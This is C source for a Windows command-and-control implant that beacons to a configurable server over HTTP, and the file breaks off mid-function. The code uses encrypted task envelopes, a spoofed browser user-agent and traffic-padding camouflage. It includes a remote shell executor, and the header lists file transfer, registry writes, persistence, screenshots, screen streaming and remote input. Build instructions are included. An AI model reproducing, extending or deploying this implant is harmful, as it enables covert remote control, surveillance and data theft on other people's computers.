/* beacon.c — C implant (HTTP beacon, core tasks).
 *
 * Wire-compatible with the ForgeC2 v2 envelope:
 *   1. register frame  {uuid,seq,ts,ecdh_pub=id_pub,id_pub,secret_id,reg_hmac}
 *      reg_hmac  = b64(HMAC-SHA256(regKey, uuid||id_pub_b64||ts_be64||seq_be64))
 *   2. verify response MAC = b64(HMAC(regKey, uuid||seq||server_pub_b64))
 *   3. session key = HKDF-SHA256(X25519(id_priv, server_pub),
 *                      salt "forgec2-session-v2", info uuid)
 *   4. encrypted frames {uuid,seq,ts,c} with c = b64(nonce12||AES-GCM(inner)),
 *      AAD = uuid || 0x00 || seq_ascii. Inner body is PLAIN JSON (the server
 *      accepts unmarked JSON; no cbor/msgpack needed).
 *   5. tasks: shell/ps/ls/read/hostinfo/set_sleep/beacon_now/kill/
 *      download/upload (+ process_tree alias), services/reg_get/reg_set/
 *      reg_delete/killproc/suspend/resume/reboot/shutdown/persistence_add/
 *      persistence_list/persistence_remove/window_list/window_close,
 *      screenshot/screenshot_window/screen_stream_start/screen_stream_stop/
 *      remote_input, with per-task enc decryption (AES-GCM,
 *      AAD uuid\\0taskID) and base64 results. Streaming emits one JPEG
 *      screen_frame per beacon while enabled (dirty-frame dedup).
 *
 * Build (mingw-w64):
 *   x86_64-w64-mingw32-gcc -O2 -o cbeacon.exe beacon.c crypto_cng.c ^
 *     -lwinhttp -lbcrypt -D C2_HOST="..." -D C2_PORT=... ^
 *     -D SECRET_ID="..." -D SECRET_B64="..."
 *
 * This is a PROTOTYPE: HTTP only, no evasion.
 * Identity (UUID + X25519 key) persists in %TEMP%\\fc2c.dat.
 */
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <objidl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "sqlite3.h"
#include "crypto_cng.h"
#include "curve25519.h"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "sqlite3.lib")

/* GDI+ flat API subset, declared manually: the SDK gdiplus.h is C++-only,
 * but these entry points are plain stdcall exports in gdiplus.dll.
 * Struct layouts follow the documented MS definitions. */
typedef void GpBitmapShim;
typedef void GpImageShim;
typedef struct {
    GUID Guid;
    ULONG NumberOfValues;
    ULONG Type;
    VOID *Value;
} GDIP_EncoderParameter;
typedef struct {
    UINT Count;
    GDIP_EncoderParameter Parameter[1];
} GDIP_EncoderParameters;
typedef struct {
    CLSID Clsid;
    GUID FormatID;
    const WCHAR *CodecName;
    const WCHAR *DllName;
    const WCHAR *FormatDescription;
    const WCHAR *FilenameExtension;
    const WCHAR *MimeType;
    DWORD Flags;
    DWORD Version;
    DWORD SigCount;
    DWORD SigSize;
    BYTE *SigPattern;
    BYTE *SigMask;
} GDIP_ImageCodecInfo;
extern int __stdcall GdiplusStartup(ULONG_PTR *token, const void *input, void *output);
extern void __stdcall GdiplusShutdown(ULONG_PTR token);
extern int __stdcall GdipCreateBitmapFromHBITMAP(HBITMAP hbm, HPALETTE hpal, GpBitmapShim **bitmap);
extern int __stdcall GdipGetImageEncodersSize(UINT *numEncoders, UINT *size);
extern int __stdcall GdipGetImageEncoders(UINT numEncoders, UINT size, GDIP_ImageCodecInfo *encoders);
extern int __stdcall GdipSaveImageToStream(GpImageShim *image, IStream *stream, const CLSID *clsidEncoder, const GDIP_EncoderParameters *params);
extern int __stdcall GdipDisposeImage(GpImageShim *image);
/* {1d5be4b5-fa4a-452d-9cdd-5db35105e7eb} */
static const GUID GDIP_EncoderQuality = {0x1d5be4b5, 0xfa4a, 0x452d, {0x9c, 0xdd, 0x5d, 0xb3, 0x51, 0x05, 0xe7, 0xeb}};
#define GDIP_EncoderParameterValueTypeLong 4
#define GDIP_Ok 0

#ifndef C2_HOST
#define C2_HOST "127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT 8000
#endif
#ifndef BEACON_PATH
#define BEACON_PATH "/collect"
#endif
#ifndef SECRET_ID
#define SECRET_ID ""
#endif
#ifndef SECRET_B64
#define SECRET_B64 ""
#endif
#ifndef INTERVAL
#define INTERVAL 10
#endif

#define RESP_CAP (12u * 1024u * 1024u)
#define OUT_CAP (512u * 1024u)
#define INFO_CAP 4096
/* Cap queued result JSON (Go reenforcePendingBounds parity): drop newest
 * beyond 4MB so offline task bursts cannot grow memory without bound. */
#define RESULTS_CAP (4u * 1024u * 1024u)

/* Runtime sleep interval (seconds), mutable via set_sleep task. */
static int g_interval = INTERVAL;
static int g_jitter = 0;

/* Live screen-stream state (screen_stream_start/stop). While set, the main
 * beacon loop captures one JPEG frame per iteration (i.e. one frame per
 * beacon) and queues it as a screen_frame result. */
static int g_streaming = 0;
static unsigned long g_stream_hash = 0;
static int g_stream_q = 65;

static BYTE g_regkey[32];
static BYTE g_sesskey[32];
static int g_have_session = 0;
static char g_uuid[40];
static unsigned long long g_seq = 0;
static void seq_save(void) {
    char p[260];
    DWORD n = GetTempPathA((DWORD)sizeof(p), p);
    FILE *f;
    if (n == 0 || n >= sizeof(p) - 16) return;
    strcat_s(p, sizeof(p), "fc2c.seq");
    f = fopen(p, "w");
    if (!f) return;
    fprintf(f, "%llu", g_seq);
    fclose(f);
}
static void seq_load(void) {
    char p[260];
    DWORD n = GetTempPathA((DWORD)sizeof(p), p);
    FILE *f;
    unsigned long long v = 0;
    if (n == 0 || n >= sizeof(p) - 16) return;
    strcat_s(p, sizeof(p), "fc2c.seq");
    f = fopen(p, "r");
    if (!f) return;
    if (fscanf(f, "%llu", &v) == 1 && v > g_seq) g_seq = v;
    fclose(f);
}
static unsigned long long next_seq(void) {
    ++g_seq;
    seq_save();
    return g_seq;
}
static int g_registered = 0;

/* ---------- tiny JSON helpers (responses only contain known shapes) ---------- */

static const char *jskip(const char *p) {
    while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r') p++;
    return p;
}

/* Find top-level "key" and return pointer to its value (caller parses). */
static const char *jfind(const char *json, const char *key) {
    char pat[128];
    const char *p;
    _snprintf(pat, sizeof(pat), "\"%s\"", key);
    p = strstr(json, pat);
    if (!p) return NULL;
    p += strlen(pat);
    p = jskip(p);
    if (*p != ':') return NULL;
    return jskip(p + 1);
}

/* Extract a JSON string value into out (unescapes \" and \\). Returns 1 on ok. */
static int jstring(const char *json, const char *key, char *out, size_t outcap) {
    const char *p = jfind(json, key);
    size_t o = 0;
    if (!p || *p != '"') return 0;
    p++;
    while (*p && *p != '"' && o + 1 < outcap) {
        if (*p == '\\' && p[1]) {
            p++;
            if (*p == 'n') out[o++] = '\n';
            else if (*p == 't') out[o++] = '\t';
            else out[o++] = *p;
            p++;
        } else {
            out[o++] = *p++;
        }
    }
    out[o] = '\0';
    return *p == '"';
}

static int jbool(const char *json, const char *key) {
    const char *p = jfind(json, key);
    return p && strncmp(p, "true", 4) == 0;
}

static unsigned long long ju64(const char *json, const char *key) {
    const char *p = jfind(json, key);
    if (!p) return 0;
    return _strtoui64(p, NULL, 10);
}

/* Escape a string for JSON output. Returns malloc'd buffer. */
static char *jescape(const char *s, size_t maxlen) {
    size_t i, o = 0, cap = maxlen * 2 + 1;
    char *out = (char *)malloc(cap);
    if (!out) return NULL;
    for (i = 0; s[i] && i < maxlen && o + 6 < cap; i++) {
        unsigned char c = (unsigned char)s[i];
        if (c == '"') { out[o++] = '\\'; out[o++] = '"'; }
        else if (c == '\\') { out[o++] = '\\'; out[o++] = '\\'; }
        else if (c == '\n') { out[o++] = '\\'; out[o++] = 'n'; }
        else if (c == '\r') { out[o++] = '\\'; out[o++] = 'r'; }
        else if (c == '\t') { out[o++] = '\\'; out[o++] = 't'; }
        else if (c < 0x20) { o += _snprintf(out + o, cap - o, "\\u%04x", c); }
        else out[o++] = (char)c;
    }
    out[o] = '\0';
    return out;
}

/* ---------- HTTP ---------- */

/* E2E debug sink: compiled out unless -DE2E_DEBUG (avoids disk IOC). */
static void dbglog(const char *tag, const char *data, int datalen) {
#ifdef E2E_DEBUG
    FILE *f = fopen("C:\\Windows\\Temp\\cbeacon-dbg.log", "ab");
    if (!f) return;
    fprintf(f, "[%s len=%d] ", tag, datalen);
    if (data && datalen > 0) {
        int n = datalen > 600 ? 600 : datalen;
        fwrite(data, 1, (size_t)n, f);
    }
    fprintf(f, "\n");
    fclose(f);
#else
    (void)tag; (void)data; (void)datalen;
#endif
}

/* Padded POST body (8-byte BE length plus jitter); defined below. */
static char *pad_body(const char *body, DWORD bodylen, DWORD *outlen);

static char *http_post(const char *body, DWORD bodylen, DWORD *outlen) {
    HINTERNET hSess = NULL, hConn = NULL, hReq = NULL;
    char *resp = NULL;
    DWORD cap = 65536, len = 0, avail = 0, got = 0;
    wchar_t whost[256], wpath[256];
    MultiByteToWideChar(CP_UTF8, 0, C2_HOST, -1, whost, 256);
    MultiByteToWideChar(CP_UTF8, 0, BEACON_PATH, -1, wpath, 256);
    /* URI jitter: ?<6 letters>=<12 hex> per beacon (Go jitterQueryPair
     * parity). Profile URIs may already carry a query: extend with &. */
    {
        BYTE r[6];
        int i;
        static const wchar_t hexd[] = L"0123456789abcdef";
        if (cng_random(r, sizeof(r)) == 0) {
            size_t wl = wcslen(wpath);
            if (wl + 21 < 256) {
                wpath[wl++] = wcschr(wpath, L'?') ? L'&' : L'?';
                for (i = 0; i < 6; i++) wpath[wl++] = (wchar_t)(L'a' + (r[i] % 26));
                wpath[wl++] = L'=';
                for (i = 0; i < 6; i++) {
                    wpath[wl++] = hexd[(r[i] >> 4) & 15];
                    wpath[wl++] = hexd[r[i] & 15];
                }
                wpath[wl] = L'\0';
            }
        }
    }
    resp = (char *)malloc(cap);
    if (!resp) return NULL;
    hSess = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) goto done;
    hConn = WinHttpConnect(hSess, whost, (INTERNET_PORT)C2_PORT, 0);
    if (!hConn) goto done;
    hReq = WinHttpOpenRequest(hConn, L"POST", wpath, NULL, WINHTTP_NO_REFERER,
                              WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hReq) goto done;
    {
        wchar_t hdrs[] = L"Content-Type: text/plain;charset=UTF-8\r\n";
        DWORD hlen = (DWORD)-1L;
                DWORD sendlen = bodylen;
        char *sendbuf = pad_body(body, bodylen, &sendlen);
        BOOL sent;
        if (!sendbuf) goto done;
        sent = WinHttpSendRequest(hReq, hdrs, hlen, (LPVOID)sendbuf, sendlen,
                                  sendlen, 0);
        cng_wipe(sendbuf, sendlen);
        free(sendbuf);
        if (!sent) goto done;
        if (!WinHttpReceiveResponse(hReq, NULL)) goto done;
        for (;;) {
            if (!WinHttpQueryDataAvailable(hReq, &avail)) goto done;
            if (avail == 0) break;
            while (len + avail + 1 > cap) {
                cap *= 2;
                if (cap > RESP_CAP) goto done;
                resp = (char *)realloc(resp, cap);
                if (!resp) goto done2;
            }
            if (!WinHttpReadData(hReq, resp + len, avail, &got)) goto done;
            if (got == 0) break;
            len += got;
        }
        resp[len] = '\0';
        if (outlen) *outlen = len;
        if (hReq) WinHttpCloseHandle(hReq);
        if (hConn) WinHttpCloseHandle(hConn);
        if (hSess) WinHttpCloseHandle(hSess);
        return resp;
    }
done:
    free(resp);
    resp = NULL;
done2:
    if (hReq) WinHttpCloseHandle(hReq);
    if (hConn) WinHttpCloseHandle(hConn);
    if (hSess) WinHttpCloseHandle(hSess);
    return resp;
}

/* ---------- crypto glue ---------- */

static void put_be64(BYTE out[8], unsigned long long v) {
    int i;
    for (i = 0; i < 8; i++) out[7 - i] = (BYTE)(v >> (8 * i));
}

/* Forward declaration (defined below, used by pad_body). */
static void put_be64(BYTE out[8], unsigned long long v);

/* Traffic camouflage (mirrors Go ContentLengthJitter=512 + JitterURI=true):
 * pad every POST body with an 8-byte BE length prefix plus up to
 * CONTENT_JITTER_MAX random bytes (server stripBodyPadding removes it;
 * short bodies pass through untouched, so old servers still accept it).
 * Compile-time overridable: -DCONTENT_JITTER_MAX=0 disables padding. */
#ifndef CONTENT_JITTER_MAX
#define CONTENT_JITTER_MAX 512
#endif
static char *pad_body(const char *body, DWORD bodylen, DWORD *outlen) {
    BYTE rnd[8];
    DWORD pad = 0;
    char *out;
    if (CONTENT_JITTER_MAX > 0 && cng_random(rnd, sizeof(rnd)) == 0)
        pad = ((unsigned)rnd[0] | ((unsigned)rnd[1] << 8)) % (CONTENT_JITTER_MAX + 1);
    out = (char *)malloc((size_t)bodylen + 8 + pad);
    if (!out) return NULL;
    put_be64((BYTE *)out, bodylen);
    memcpy(out + 8, body, bodylen);
    if (pad) {
        if (cng_random((BYTE *)(out + 8 + bodylen), pad) != 0)
            memset(out + 8 + bodylen, 0, pad);
    }
    *outlen = bodylen + 8 + pad;
    return out;
}

/* reg_hmac = b64(HMAC(regKey, uuid||idpub_b64||ts_be64||seq_be64)) */
static char *make_reg_hmac(const char *idpub_b64, long long ts,
                           unsigned long long seq) {
    BYTE tsb[8], seqb[8], mac[32];
    BYTE *msg;
    DWORD msglen;
    char *out;
    put_be64(tsb, (unsigned long long)ts);
    put_be64(seqb, seq);
    msglen = (DWORD)(strlen(g_uuid) + strlen(idpub_b64) + 16);
    msg = (BYTE *)malloc(msglen);
    if (!msg) return NULL;
    memcpy(msg, g_uuid, strlen(g_uuid));
    memcpy(msg + strlen(g_uuid), idpub_b64, strlen(idpub_b64));
    memcpy(msg + strlen(g_uuid) + strlen(idpub_b64), tsb, 8);
    memcpy(msg + strlen(g_uuid) + strlen(idpub_b64) + 8, seqb, 8);
    if (cng_hmac_sha256(g_regkey, 32, msg, msglen, mac) != 0) {
        cng_wipe(msg, msglen);
        free(msg);
        return NULL;
    }
    cng_wipe(msg, msglen);
    free(msg);
    out = b64enc(mac, 32);
    cng_wipe(mac, 32);
    return out;
}

/* frame mac = b64(HMAC(regKey, parts...)) for response verification. */
static int verify_resp_mac(unsigned long long seq, const char *server_pub_b64,
                           const char *mac_b64) {
    char seqs[32];
    BYTE mac[32], *got = NULL;
    DWORD gotlen = 0;
    int ok = 0;
    _snprintf(seqs, sizeof(seqs), "%llu", seq);
    {
        size_t a = strlen(g_uuid), b = strlen(seqs), c = strlen(server_pub_b64);
        char *msg = (char *)malloc(a + b + c + 1);
        BYTE digest[32];
        char *expect;
        if (!msg) return 0;
        memcpy(msg, g_uuid, a);
        memcpy(msg + a, seqs, b);
        memcpy(msg + a + b, server_pub_b64, c);
        msg[a + b + c] = '\0';
        if (cng_hmac_sha256(g_regkey, 32, (BYTE *)msg, (DWORD)(a + b + c), digest) != 0) {
            free(msg);
            return 0;
        }
        free(msg);
        expect = b64enc(digest, 32);
        cng_wipe(digest, 32);
        got = b64dec(mac_b64, &gotlen);
        if (expect && got && gotlen == 32 &&
            memcmp(expect, mac_b64, strlen(mac_b64)) == 0 &&
            strlen(expect) == strlen(mac_b64)) {
            /* constant-time compare on decoded bytes */
            unsigned diff = 0;
            BYTE *expb;
            DWORD explen = 0;
            expb = b64dec(expect, &explen);
            if (expb && explen == 32) {
                DWORD i;
                for (i = 0; i < 32; i++) diff |= (unsigned)(expb[i] ^ got[i]);
                ok = diff == 0;
                cng_wipe(expb, explen);
                free(expb);
            }
        }
        (void)mac;
        free(expect);
        if (got) { cng_wipe(got, gotlen); free(got); }
    }
    return ok;
}

/* ---------- tasks ---------- */

static char *exec_shell(const char *cmd, DWORD *outlen) {
    /* _popen runs through cmd.exe /c by default on Windows. */
    FILE *fp;
    char *buf;
    size_t cap = 65536, len = 0, n;
    char chunk[8192];
    buf = (char *)malloc(cap);
    if (!buf) return NULL;
    fp = _popen(cmd, "r");
    if (!fp) {
        strcpy_s(buf, cap, "[cbeacon] exec failed");
        if (outlen) *outlen = (DWORD)strlen(buf);
        return buf;
    }
    while ((n = fread(chunk, 1, sizeof(chunk), fp)) > 0) {
        if (len + n + 1 > cap) {
            if (cap >= OUT_CAP) break;
            cap *= 2;
            if (cap > OUT_CAP + 65536) cap = OUT_CAP + 65536;
            buf = (char *)realloc(buf, cap);
            if (!buf) { _pclose(fp); return NULL; }
        }
        if (len >= OUT_CAP) break;
        if (len + n > OUT_CAP) n = OUT_CAP - len;
        memcpy(buf + len, chunk, n);
        len += n;
    }
    _pclose(fp);
    buf[len] = '\0';
    if (outlen) *outlen = (DWORD)len;
    return buf;
}

typedef struct {
    unsigned long long id;
    char type[48];
    char *command;
    char *shell;
    char *path;
    char *data;
    int enc;
    long long offset;
    long long size;
    char *prev_mac;
    char *mac;
} ctask_t;

/* Decrypt one base64(nonce12||ct||tag16) field with the session key.
 * AAD = uuid || 0x00 || taskID_ascii (mirrors Go decryptAESGCMWithAAD).
 * Returns malloc'd NUL-terminated plaintext, or NULL on failure. */
static char *decrypt_task_field(const char *b64, unsigned long long taskid) {
    char tids[32];
    BYTE *blob = NULL;
    DWORD bloblen = 0;
    BYTE *pt = NULL;
    char *aad = NULL;
    DWORD aadlen = 0;
    int ptlen = -1;
    char *out = NULL;
    if (!b64 || !b64[0]) return _strdup("");
    _snprintf(tids, sizeof(tids), "%llu", taskid);
    aadlen = (DWORD)(strlen(g_uuid) + 1 + strlen(tids));
    aad = (char *)malloc(aadlen);
    if (!aad) return NULL;
    memcpy(aad, g_uuid, strlen(g_uuid));
    aad[strlen(g_uuid)] = '\0';
    memcpy(aad + strlen(g_uuid) + 1, tids, strlen(tids));
    blob = b64dec(b64, &bloblen);
    if (!blob) { free(aad); return NULL; }
    pt = (BYTE *)malloc(bloblen + 1);
    if (!pt) { free(aad); free(blob); return NULL; }
    ptlen = cng_aesgcm_decrypt(g_sesskey, blob, bloblen,
                               (const BYTE *)aad, aadlen, pt, bloblen);
    cng_wipe(aad, aadlen);
    free(aad);
    free(blob);
    if (ptlen < 0) { cng_wipe(pt, bloblen); free(pt); return NULL; }
    out = (char *)malloc((size_t)ptlen + 1);
    if (!out) { cng_wipe(pt, (DWORD)ptlen); free(pt); return NULL; }
    memcpy(out, pt, (size_t)ptlen);
    out[ptlen] = '\0';
    cng_wipe(pt, (DWORD)ptlen);
    free(pt);
    return out;
}

/* Decrypt enc-wrapped task fields in place. Returns 0 ok, -1 on failure
 * (caller must report "task payload decryption failed"). */
static int decrypt_task(ctask_t *t) {
    char *d;
    if (!t->enc) return 0;
    if (t->command && t->command[0]) {
        d = decrypt_task_field(t->command, t->id);
        if (!d) return -1;
        free(t->command);
        t->command = d;
    }
    if (t->data && t->data[0]) {
        d = decrypt_task_field(t->data, t->id);
        if (!d) return -1;
        free(t->data);
        t->data = d;
    }
    if (t->shell && t->shell[0]) {
        d = decrypt_task_field(t->shell, t->id);
        if (d) { free(t->shell); t->shell = d; }
        /* shell decrypt failure is non-fatal except token_make parity:
         * keep cleartext interpreter (cmd.exe/powershell) like Go does. */
    }
    return 0;
}

static void free_task(ctask_t *t) {
    if (t->command) free(t->command);
    if (t->shell) free(t->shell);
    if (t->path) free(t->path);
    if (t->data) free(t->data);
    if (t->prev_mac) free(t->prev_mac);
    if (t->mac) free(t->mac);
    memset(t, 0, sizeof(*t));
}

/* File-transfer integrity chain (mirrors Go fileChainKey/chainPrev/commit):
 * chainKey = HKDF(regKey, salt "forgec2-filechain-v1", info "file-transfer");
 * link = HMAC(chainKey, prev || data), hex-encoded on the wire. */
#define CHAIN_SLOTS 32
static void hex_encode(const BYTE *in, size_t len, char *out);
static BYTE g_chainkey[32];
static int g_chainkey_ok = 0;
static struct { unsigned long long id; BYTE prev[32]; int used; } g_chains[CHAIN_SLOTS];

static int chain_key(void) {
    if (g_chainkey_ok) return 0;
    if (cng_hkdf_sha256(g_regkey, 32,
                         (const BYTE *)"forgec2-filechain-v1", 22,
                         (const BYTE *)"file-transfer", 13,
                         g_chainkey) != 0) return -1;
    g_chainkey_ok = 1;
    return 0;
}

static BYTE *chain_prev(unsigned long long id) {
    int i;
    for (i = 0; i < CHAIN_SLOTS; i++)
        if (g_chains[i].used && g_chains[i].id == id) return g_chains[i].prev;
    return NULL;
}

static void chain_commit(unsigned long long id, const BYTE mac[32]) {
    int i, slot = -1;
    for (i = 0; i < CHAIN_SLOTS; i++) {
        if (g_chains[i].used && g_chains[i].id == id) { slot = i; break; }
        if (!g_chains[i].used && slot < 0) slot = i;
    }
    if (slot < 0) slot = (int)(id % CHAIN_SLOTS);
    g_chains[slot].id = id;
    memcpy(g_chains[slot].prev, mac, 32);
    g_chains[slot].used = 1;
}

static int hex_to32(const char *hex, BYTE out[32]) {
    size_t k;
    if (!hex || strlen(hex) != 64) return -1;
    for (k = 0; k < 32; k++) {
        char hb[3] = { hex[2*k], hex[2*k+1], 0 };
        char *end = NULL;
        unsigned long v = strtoul(hb, &end, 16);
        if (!end || *end) return -1;
        out[k] = (BYTE)v;
    }
    return 0;
}

/* Adopt a server-supplied chain prev (upload push path, mirrors Go). */
static int chain_adopt(unsigned long long id, const char *prev_hex) {
    BYTE prev[32];
    int i, slot = -1;
    if (hex_to32(prev_hex, prev) != 0) return -1;
    for (i = 0; i < CHAIN_SLOTS; i++) {
        if (g_chains[i].used && g_chains[i].id == id) { slot = i; break; }
        if (!g_chains[i].used && slot < 0) slot = i;
    }
    if (slot < 0) slot = (int)(id % CHAIN_SLOTS);
    g_chains[slot].id = id;
    memcpy(g_chains[slot].prev, prev, 32);
    g_chains[slot].used = 1;
    cng_wipe(prev, 32);
    return 0;
}

static int chain_hmac(const BYTE prev[32], const BYTE *data, DWORD datalen,
                      BYTE out[32]) {
    DWORD mlen = datalen + 32;
    BYTE *msg = (BYTE *)malloc(mlen);
    int rc = -1;
    if (!msg) return -1;
    memcpy(msg, prev, 32);
    if (datalen) memcpy(msg + 32, data, datalen);
    rc = cng_hmac_sha256(g_chainkey, 32, msg, mlen, out);
    cng_wipe(msg, mlen);
    free(msg);
    return rc;
}

/* Download path: link = HMAC(key, stored_prev || data), commit, hex out. */
static int chain_download_link(unsigned long long id, const BYTE *data,
                               DWORD datalen, char hexout[65]) {
    BYTE prev[32], mac[32];
    BYTE *p;
    if (chain_key() != 0) return -1;
    memset(prev, 0, 32);
    p = chain_prev(id);
    if (p) memcpy(prev, p, 32);
    if (chain_hmac(prev, data, datalen, mac) != 0) return -1;
    chain_commit(id, mac);
    hex_encode(mac, 32, hexout);
    cng_wipe(mac, 32);
    return 0;
}

/* Upload path: adopt prev when supplied, verify expected MAC when supplied
 * (constant-time compare), commit on match. Mirrors Go verifyFileChunk. */
static int chain_verify_upload(unsigned long long id, const BYTE *data,
                               DWORD datalen, const char *prev_hex,
                               const char *expected_hex) {
    BYTE prev[32], mac[32], want[32];
    BYTE *p;
    DWORD i;
    unsigned diff;
    if (chain_key() != 0) return -1;
    if (prev_hex && prev_hex[0] && chain_adopt(id, prev_hex) != 0) return -1;
    if (!expected_hex || !expected_hex[0]) return 0;
    if (hex_to32(expected_hex, want) != 0) return -1;
    memset(prev, 0, 32);
    p = chain_prev(id);
    if (p) memcpy(prev, p, 32);
    if (chain_hmac(prev, data, datalen, mac) != 0) {
        cng_wipe(want, 32); return -1;
    }
    diff = 0;
    for (i = 0; i < 32; i++) diff |= (unsigned)(mac[i] ^ want[i]);
    cng_wipe(want, 32);
    if (diff != 0) { cng_wipe(mac, 32); return -1; }
    chain_commit(id, mac);
    cng_wipe(mac, 32);
    return 0;
}

/* Reject ".." path components (mirrors Go sanitizeWritePath). */
static int path_is_safe(const char *p) {
    const char *s = p;
    char comp[16];
    size_t cl = 0;
    if (!p || !p[0]) return 0;
    for (;;) {
        char c = *s;
        if (c == '/' || c == '\\' || c == '\0') {
            if (cl == 2 && comp[0] == '.' && comp[1] == '.') return 0;
            cl = 0;
            if (c == '\0') break;
        } else if (cl < sizeof(comp)) {
            comp[cl++] = c;
        }
        s++;
    }
    return 1;
}

static void hex_encode(const BYTE *in, size_t len, char *out) {
    static const char *h = "0123456789abcdef";
    size_t i;
    for (i = 0; i < len; i++) { out[2*i] = h[in[i] >> 4]; out[2*i+1] = h[in[i] & 15]; }
    out[2*len] = '\0';
}

/* Parse one task object (we are positioned at its '{'). Fills t (strings
 * malloc'd). Returns pointer past the object, or NULL. */
static const char *parse_task(const char *p, ctask_t *t) {
    char typ[48] = {0};
    char *cmd = NULL, *sh = NULL, *pa = NULL, *da = NULL;
    int depth = 0;
    const char *start = p, *q;
    memset(t, 0, sizeof(*t));
    /* find matching brace */
    q = p;
    do {
        if (*q == '"') {
            q++;
            while (*q && *q != '"') { if (*q == '\\' && q[1]) q++; q++; }
        } else if (*q == '{') {
            depth++;
        } else if (*q == '}') {
            depth--;
        }
        q++;
    } while (*q && depth > 0);
    {
        size_t objlen = (size_t)(q - start);
        char *obj = (char *)malloc(objlen + 1);
        if (!obj) return NULL;
        memcpy(obj, start, objlen);
        obj[objlen] = '\0';
        if (jstring(obj, "type", typ, sizeof(typ)))
            strcpy_s(t->type, sizeof(t->type), typ);
        {
            const char *pi = jfind(obj, "id");
            if (pi) t->id = _strtoui64(pi, NULL, 10);
        }
        t->enc = jbool(obj, "enc");
        cmd = (char *)malloc(objlen + 1);
        sh = (char *)malloc(objlen + 1);
        pa = (char *)malloc(objlen + 1);
        da = (char *)malloc(objlen + 1);
        if (cmd && jstring(obj, "command", cmd, objlen + 1)) t->command = _strdup(cmd);
        if (sh && jstring(obj, "shell", sh, objlen + 1)) t->shell = _strdup(sh);
        if (pa && jstring(obj, "path", pa, objlen + 1)) t->path = _strdup(pa);
        if (da && jstring(obj, "data", da, objlen + 1)) t->data = _strdup(da);
        t->offset = (long long)ju64(obj, "offset");
        t->size = (long long)ju64(obj, "size");
        {
            char pm[128] = {0}, em[128] = {0};
            if (jstring(obj, "prev_mac", pm, sizeof(pm))) t->prev_mac = _strdup(pm);
            if (jstring(obj, "mac", em, sizeof(em))) t->mac = _strdup(em);
        }
        if (cmd) free(cmd);
        if (sh) free(sh);
        if (pa) free(pa);
        if (da) free(da);
        free(obj);
    }
    return q;
}

/* ---------- host info + task handlers (wire-compatible with Go agent) ---------- */

/* UTF-8 hostname/username via W APIs: GetComputerNameA returns ANSI (GBK on
 * Chinese Windows) which corrupts JSON as mojibake. W + CP_UTF8 matches Go's
 * os.Hostname (UTF-16 -> UTF-8) so CJK hostnames survive the wire. */
static void get_hostname_utf8(char *out, DWORD cap) {
    WCHAR w[256] = {0};
    DWORD wlen = 256;
    if (GetComputerNameW(w, &wlen) && w[0]) {
        int n = WideCharToMultiByte(CP_UTF8, 0, w, -1, out, (int)cap, NULL, NULL);
        if (n > 0) return;
    }
    strncpy(out, "unknown", cap - 1);
}
static void get_username_utf8(char *out, DWORD cap) {
    WCHAR w[256] = {0};
    DWORD wlen = 256;
    if (GetUserNameW(w, &wlen) && w[0]) {
        int n = WideCharToMultiByte(CP_UTF8, 0, w, -1, out, (int)cap, NULL, NULL);
        if (n > 0) return;
    }
    strncpy(out, "unknown", cap - 1);
}
static char *b64_of_str(const char *s) {
    char *o;
    if (!s) s = "";
    o = b64enc((const BYTE *)s, (DWORD)strlen(s));
    return o ? o : _strdup("");
}

/* Build the inner \"info\" object JSON (malloc'd). Mirrors Go getSystemInfo:
 * hostname/username/ip are base64 with encoding=base64 marker. */
static char *build_info_json(void) {
    char host[512] = {0}, user[512] = {0};
    char *hb64 = NULL, *ub64 = NULL;
    char *out = NULL;
    char pname[MAX_PATH] = {0};
    DWORD pid = GetCurrentProcessId();
    get_hostname_utf8(host, sizeof(host));
    get_username_utf8(user, sizeof(user));
    GetModuleFileNameA(NULL, pname, sizeof(pname));
    {
        char *base = strrchr(pname, '\\');
        if (base) memmove(pname, base + 1, strlen(base));
    }
    hb64 = b64_of_str(host);
    ub64 = b64_of_str(user);
    out = (char *)malloc(INFO_CAP);
    if (out) {
        _snprintf(out, INFO_CAP,
            "\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows\","
            "\"arch\":\"amd64\",\"implant\":\"c\",\"encoding\":\"base64\","
            "\"pid\":\"%lu\",\"process_name\":\"%s\","
            "\"interval\":\"%d\",\"jitter\":\"%d\",\"version\":\"c-0.3\"",
            hb64, ub64, (unsigned long)pid, pname[0] ? pname : "cbeacon.exe",
            g_interval, g_jitter);
    }
    free(hb64);
    free(ub64);
    return out;
}

static char *make_rid(void) {
    BYTE rb[16];
    char *rid = (char *)malloc(40);
    if (!rid) return NULL;
    if (cng_random(rb, 16) != 0) { free(rid); return NULL; }
    _snprintf(rid, 40, "%02x%02x%02x%02x-%02x%02x-4%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        rb[0], rb[1], rb[2], rb[3], rb[4], rb[5], rb[6] & 0x0F,
        rb[8] & 0x3F, rb[9], rb[10], rb[11], rb[12], rb[13], rb[14], rb[15]);
    return rid;
}

/* Emit one result object (malloc'd). b64out must already be base64 text. */
static char *emit_b64_result(unsigned long long id, const char *type,
                             const char *b64out, const char *rid) {
    size_t need = strlen(b64out) + strlen(type) + 128;
    char *o = (char *)malloc(need);
    if (!o) return NULL;
    _snprintf(o, need,
        "{\"task_id\":%llu,\"type\":\"%s\",\"output\":\"%s\","
        "\"encoding\":\"base64\",\"rid\":\"%s\"}",
        id, type, b64out, rid ? rid : "");
    return o;
}

static char *emit_text_result(unsigned long long id, const char *type,
                              const char *text, const char *rid) {
    char *esc = jescape(text ? text : "", strlen(text ? text : ""));
    char *o;
    size_t need;
    if (!esc) return NULL;
    need = strlen(esc) + strlen(type) + 128;
    o = (char *)malloc(need);
    if (o) {
        _snprintf(o, need,
            "{\"task_id\":%llu,\"type\":\"%s\",\"output\":\"%s\",\"rid\":\"%s\"}",
